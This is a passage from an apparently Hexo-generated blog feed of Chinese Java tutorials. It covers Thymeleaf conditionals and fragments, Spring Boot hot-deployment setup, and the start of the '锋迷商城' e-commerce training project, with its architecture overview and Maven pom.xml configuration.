punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>unless</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${b.bookPrice}&gt;40<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>太贵！！！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${b.bookPrice}&lt;=40<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>green</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>推荐购买<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>th:switch 和 th:case</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>switch</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${b.bookPrice}/10<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name"><span class="token namespace">th:</span>case</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>建议购买<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name"><span class="token namespace">th:</span>case</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>价格合理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name"><span class="token namespace">th:</span>case</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>价格不合理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>switch</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>${user.gender}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name"><span class="token namespace">th:</span>case</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>M<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>男<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name"><span class="token namespace">th:</span>case</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>F<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>女<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name"><span class="token namespace">th:</span>case</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>性别不详<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="7-5-碎片使用"><a href="#7-5-碎片使用" class="headerlink" title="7.5 碎片使用"></a>7.5 碎片使用</h4><h6 id="7-5-1-碎片的概念"><a href="#7-5-1-碎片的概念" class="headerlink" title="7.5.1 碎片的概念"></a>7.5.1 碎片的概念</h6><blockquote><p>碎片，就是HTML片段，我们可以将多个页面中使用的相同的HTML标签部分单独定义，然后通过th:include可以在HTML网页中引入定义的碎片</p></blockquote><p><img src="imgs/1618285737205.png" alt="1618285737205"></p><h6 id="7-5-2-碎片使用案例"><a href="#7-5-2-碎片使用案例" class="headerlink" title="7.5.2 碎片使用案例"></a>7.5.2 碎片使用案例</h6><ul><li><p>定义碎片  th:fragment</p><ul><li><p>header.html</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fragment1<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 80px<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span> deepskyblue<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span> <span class="token property">font-size</span><span class="token punctuation">:</span> 25px<span class="token punctuation">;</span> <span class="token property">font-family</span><span class="token punctuation">:</span>文鼎霹雳体</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    千锋武汉Java2010班，六六六！！！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>footer.html</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fragment2<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span> lightgray<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span> <span class="token property">font-size</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    千锋教育 武汉校区<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><ul><li><p>引用碎片  th:include 和 th:replace</p><ul><li><p>a.html</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--    &lt;div th:include="header::fragment1"&gt;&lt;/div&gt;--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>replace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header::fragment1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 500px</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        定义内容    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--    &lt;div th:include="footer::fragment2"&gt;&lt;/div&gt;--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>replace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer::fragment2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h2 id="八、SpringBoot应用的热部署配置"><a href="#八、SpringBoot应用的热部署配置" class="headerlink" title="八、SpringBoot应用的热部署配置"></a>八、SpringBoot应用的热部署配置</h2><h4 id="8-1-热部署"><a href="#8-1-热部署" class="headerlink" title="8.1 热部署"></a>8.1 热部署</h4><p>项目首次部署、服务启动之后，如果应用发生了变化、而且IDEA感知到了应用的变化，就自动的完成jar的更新，无需手动再次启动服务器，就可以访问应用的更新。</p><h4 id="8-2-热部署配置"><a href="#8-2-热部署配置" class="headerlink" title="8.2 热部署配置"></a>8.2 热部署配置</h4><h6 id="8-2-1-IDE配置（idea）"><a href="#8-2-1-IDE配置（idea）" class="headerlink" title="8.2.1 IDE配置（idea）"></a>8.2.1 IDE配置（idea）</h6><ul><li><p>File—settings</p><p><img src="imgs/1618294799265.png" alt="1618294799265"></p></li><li><p>Ctrl+Shift+Alt+/ —– Registry</p><table><thead><tr><th><img src="imgs/1618294947978.png" alt="1618294947978"></th></tr></thead><tbody><tr><td><img src="imgs/1618294976624.png" alt="1618294976624"></td></tr></tbody></table></li></ul><h6 id="8-2-2-SpringBoot项目配置"><a href="#8-2-2-SpringBoot项目配置" class="headerlink" title="8.2.2 SpringBoot项目配置"></a>8.2.2 SpringBoot项目配置</h6><ul><li><p>在需要进行热部署的SpringBoot应用中添加依赖</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-devtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置SpringBoot的Maven插件</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fork</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fork</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置SpringBoot应用的变化更新策略</p><p><img src="imgs/1618295466699.png" alt="1618295466699"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Springboot项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>锋迷商城</title>
      <link href="/posts/8.html"/>
      <url>/posts/8.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、《锋迷商城》项目介绍"><a href="#一、《锋迷商城》项目介绍" class="headerlink" title="一、《锋迷商城》项目介绍"></a>一、《锋迷商城》项目介绍</h2><h4 id="1-1-项目背景"><a href="#1-1-项目背景" class="headerlink" title="1.1 项目背景"></a>1.1 项目背景</h4><blockquote><p>锋迷商城——电商平台</p><ul><li>B2C 商家对客户</li><li>C2B2C 客户对商家对客户</li></ul></blockquote><h6 id="1-1-1-B2C"><a href="#1-1-1-B2C" class="headerlink" title="1.1.1 B2C"></a>1.1.1 B2C</h6><blockquote><p>平台运营方即商品的卖家    小米商城</p><ul><li>商品</li><li>用户</li></ul></blockquote><h6 id="1-1-2-C2B2C"><a href="#1-1-2-C2B2C" class="headerlink" title="1.1.2 C2B2C"></a>1.1.2 C2B2C</h6><blockquote><p>平台运营方不卖商品（也可以卖）</p><p>卖家是平台的用户</p><p>买家也是平台用户</p><ul><li>用户（店铺）</li><li>用户（买家）</li><li>服务</li><li>商品</li></ul></blockquote><h6 id="1-1-3-Java"><a href="#1-1-3-Java" class="headerlink" title="1.1.3 Java"></a>1.1.3 Java</h6><blockquote><p>Java语言的应用领域很广，但主要应用于web领域的项目开发，web项目类型分为两类：</p><ul><li>企业级开发 （供企业内部使用的系统：企业内部的管理系统CRM\ERP、学校的教务管理系统）</li><li>互联网开发（提供给所有互联网用户使用的系统——用户量）—— 电商</li></ul></blockquote><h4 id="1-2-项目功能"><a href="#1-2-项目功能" class="headerlink" title="1.2 项目功能"></a>1.2 项目功能</h4><p><a href="https://www.processon.com/view/link/606bde8b1e08534321fd2103">https://www.processon.com/view/link/606bde8b1e08534321fd2103</a></p><h4 id="1-3-技术选型"><a href="#1-3-技术选型" class="headerlink" title="1.3 技术选型"></a>1.3 技术选型</h4><blockquote><p>SSM 企业开发框架    基础的开发技术</p></blockquote><h6 id="1-3-1-单体项目"><a href="#1-3-1-单体项目" class="headerlink" title="1.3.1 单体项目"></a>1.3.1 单体项目</h6><blockquote><p>项目的页面和代码都在同一个项目，项目开发完成之后直接部署在一台服务器</p></blockquote><p><img src="imgs/1618025221720.png" alt="1618025221720"></p><p>单体项目遇到的问题：用户对页面静态资源以及对Java代码的访问压力都会落在Tomcat服务器上。</p><h6 id="1-3-2-技术清单"><a href="#1-3-2-技术清单" class="headerlink" title="1.3.2 技术清单"></a>1.3.2 技术清单</h6><ul><li>项目架构：前后端分离</li><li>前端技术：vue、axios、妹子UI、layui、bootstrap</li><li>后端技术：SpringBoot+MyBatis、RESTful、swagger</li><li>服务器搭建：Linux、Nginx</li></ul><h2 id="二、项目架构的演进"><a href="#二、项目架构的演进" class="headerlink" title="二、项目架构的演进"></a>二、项目架构的演进</h2><h4 id="2-1-单体架构"><a href="#2-1-单体架构" class="headerlink" title="2.1 单体架构"></a>2.1 单体架构</h4><ul><li>前后端都部署在同一台服务器上（前后端代码都在同一个应用中）</li><li>缺点：对静态资源的访问压力也会落在Tomcat上</li></ul><h4 id="2-2-前后端分离"><a href="#2-2-前后端分离" class="headerlink" title="2.2 前后端分离"></a>2.2 前后端分离</h4><p><img src="imgs/1618036199285.png" alt="1618036199285"></p><ul><li>前后端分离：前端和后端分离开发和部署（前后端部署在不同的服务器）</li><li>优点：将对静态资源的访问和对接口的访问进行分离，Tomcat服务器只负责数据服务的访问</li></ul><h4 id="2-3-集群与负载均衡"><a href="#2-3-集群与负载均衡" class="headerlink" title="2.3 集群与负载均衡"></a>2.3 集群与负载均衡</h4><p><img src="imgs/1618037366380.png" alt="1618037366380"></p><ul><li>优点：提供并发能力、可用性</li></ul><h4 id="2-4-分布式"><a href="#2-4-分布式" class="headerlink" title="2.4 分布式"></a>2.4 分布式</h4><p><img src="imgs/1618038441781.png" alt="1618038441781"></p><ul><li>基于redis实现 分布式锁</li><li>分布式数据库mycat</li><li>redis集群</li><li>数据库中间件</li><li>消息中间件</li></ul><h4 id="2-5-微服务架构"><a href="#2-5-微服务架构" class="headerlink" title="2.5 微服务架构"></a>2.5 微服务架构</h4><ul><li>微服务架构：将原来在一个应用中开发的多个模块进行拆分，单独开发和部署</li><li>保证可用性、性能</li></ul><h2 id="三、《锋迷商城》项目搭建"><a href="#三、《锋迷商城》项目搭建" class="headerlink" title="三、《锋迷商城》项目搭建"></a>三、《锋迷商城》项目搭建</h2><blockquote><p>基于Maven的聚合工程完成项目搭建，前端采用vue+axios，后端使用SpringBoot整合SSM</p></blockquote><h4 id="3-1-技术储备"><a href="#3-1-技术储备" class="headerlink" title="3.1 技术储备"></a>3.1 技术储备</h4><ul><li>（√）SpringBoot： 实现无配置的SSM整合</li><li>（√）Maven聚合工程：实现模块的复用</li></ul><h4 id="3-2-创建Maven聚合工程"><a href="#3-2-创建Maven聚合工程" class="headerlink" title="3.2 创建Maven聚合工程"></a>3.2 创建Maven聚合工程</h4><p><img src="imgs/1618363925912.png" alt="1618363925912"></p><h6 id="3-2-1-构建父工程fmmall"><a href="#3-2-1-构建父工程fmmall" class="headerlink" title="3.2.1 构建父工程fmmall"></a>3.2.1 构建父工程fmmall</h6><ul><li><p>创建一个maven工程、packing设置为 pom</p></li><li><p>父工程继承继承<code>spring-boot-starter-parent</code></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- spring-boot-starter-parent --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.4.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fmmall<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="3-2-2-创建common工程"><a href="#3-2-2-创建common工程" class="headerlink" title="3.2.2 创建common工程"></a>3.2.2 创建common工程</h6><ul><li><p>选择fmmall，右键—New—Module （Maven工程）</p></li><li><p>修改common的pom.xml，设置packing=jar</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fmmall<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token 